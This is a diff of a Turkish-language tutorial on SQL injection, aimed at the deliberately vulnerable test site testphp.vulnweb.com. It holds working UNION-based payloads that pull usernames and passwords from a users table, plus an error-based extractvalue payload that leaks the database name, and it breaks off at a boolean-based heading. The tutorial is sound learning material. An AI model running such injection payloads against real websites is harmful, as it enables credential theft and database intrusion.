@@ -294,7 +294,7 @@ UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users
 
 ![image](https://github.com/user-attachments/assets/c53a4f27-25e4-42b5-8f43-ca3667029bba)
 
-Bu url'i yazdığımda users tablosundan öğrendiğim uname ve pass değerlerinin arasına adımı da yazdıyorum ki çıktı da rahatça ayırt edebileyim.
+Bu url'i yazdığımda users tablosundan öğrendiğim uname ve pass değerlerinin arasına adımı da yazdıyorum ki çıktı da rahatça ayırt edebileyim. Bu sayede sqlmap'in nasıl çalıştığı da anlaşılıyor.
 
 ```
 http://testphp.vulnweb.com/listproducts.php?cat=-1
@@ -303,4 +303,25 @@ UNION SELECT 1,2,3,4,5,6,concat(uname,':samed:',pass),8,9,10,11 FROM users
 
 ![image](https://github.com/user-attachments/assets/7f4e42bd-3a6d-414f-8801-0469e70bbe3c)
 
+# **2- Error Based SQLi**
 
+Veri tabanında bir syntax hatası olduğunda çalışan bir try-except yoksa, database'den dönen hata mesajını kullanarak veri çekmenin bir yolu var.
+
+SQLi yaparken deneme yapabileceğimiz bir ortam olmalı biz de bunu mysql ile yapıyoruz. 
+
+https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html
+
+Kendi deneme ortamımda yazdığım sorgu böyle sonuç veriyor ve ben de bu sorguyu url'e ekleyip sonucu görüyorum.
+
+```
+MariaDB [TEST]> SELECT extractvalue(rand(),concat(1,(SELECT database())));
+ERROR 1105 (HY000): XPATH syntax error: 'TEST'
+```
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(),concat(1,(SELECT%20database())));
+```
+
+![image](https://github.com/user-attachments/assets/98e5f879-f7c2-4b9b-a1f4-15407af8c5b0)
+
+# **3- Boolean-based SQL Injection**
